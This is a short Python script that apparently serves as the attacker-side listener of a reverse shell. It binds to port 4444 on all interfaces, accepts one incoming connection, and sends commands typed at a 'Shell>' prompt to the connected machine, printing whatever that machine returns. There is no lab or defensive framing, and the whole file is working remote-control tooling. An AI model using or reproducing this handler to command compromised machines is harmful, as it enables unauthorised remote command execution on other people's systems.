import socket

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

s = socket.socket()
s.bind((LISTEN_IP, LISTEN_PORT))
s.listen(1)
print(f"Listening on {LISTEN_PORT}...")

conn, addr = s.accept()
print(f"Connection from {addr}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        conn.send(b"exit")
        break
    conn.send(command.encode())
    response = conn.recv(4096).decode()
    print(response)

conn.close()
s.close()
